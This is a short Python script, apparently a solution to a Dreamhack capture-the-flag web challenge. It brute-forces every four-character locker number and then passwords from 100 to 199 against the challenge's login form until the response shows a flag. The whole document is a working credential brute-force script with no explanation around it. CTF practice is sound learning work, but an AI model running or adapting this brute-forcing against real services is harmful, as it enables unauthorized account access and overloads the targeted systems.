import requests
import string

port = 24314
url_index = f"http://host3.dreamhack.games:{port}/"

alphanumeric = string.ascii_lowercase + string.digits

for l1 in alphanumeric:
  for l2 in alphanumeric:
    for l3 in alphanumeric:
      for l4 in alphanumeric:
        locker_num = l1 + l2 + l3 + l4
        # if locker_num < "aaid" :
        #   continue
        print(locker_num)
        param = {
            "locker_num" : locker_num,
            "password" : 100
          }
        r = requests.post(url_index, data = param)
        if "Good" in r.text :
          for password in range(100, 200) :
            param = {
              "locker_num" : locker_num,
              "password" : password
            }
            r = requests.post(url_index, data = param)
            if "FLAG" in r.text :
              print(r.text)
              break
          break